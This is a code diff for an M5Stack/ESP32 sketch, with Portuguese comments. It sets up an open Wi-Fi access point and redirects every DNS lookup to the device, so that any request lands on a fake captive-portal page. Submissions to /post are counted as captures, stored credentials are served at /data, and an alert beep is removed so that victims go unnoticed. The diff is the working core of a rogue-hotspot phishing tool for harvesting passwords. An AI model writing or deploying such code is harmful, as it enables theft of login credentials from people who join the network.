@@ -93,8 +93,43 @@ void BLINK() { //O led pisca 5 vezes quando recebe data
 }
 
 void setup() {
-  // put your setup code here, to run once:
+  M5.begin();
+  M5.Lcd.setRotation(3);
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setSwapBytes(true);
+  M5.Lcd.setTextSize(2);
 
+  bootTime = lastActivity = millis();
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(SSID_NAME);
+  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (somente HTTP)
+
+  webServer.on("/post", []() {
+    capcount=capcount+1;
+    webServer.send(HTTP_CODE, "text/html", posted());
+    /*M5.Beep.tone(4000);*/ //Removing the Beep effect when someone uses the WiFi
+    M5.Lcd.print("Data de Users");
+    delay(50);
+    M5.Beep.mute();
+    BLINK();
+    M5.Lcd.fillScreen(BLACK);
+  });
+
+  webServer.on("/data", []() {
+    webServer.send(HTTP_CODE, "text/html", creds());
+  });
+  webServer.on("/clear", []() {
+    webServer.send(HTTP_CODE, "text/html", clear());
+  });
+  webServer.onNotFound([]() {
+    lastActivity = millis();
+    webServer.send(HTTP_CODE, "text/html", index());
+
+  });
+  webServer.begin();
+  pinMode(BUILTIN_LED, OUTPUT);
+  digitalWrite(BUILTIN_LED, HIGH);
 }
 
 void loop() {
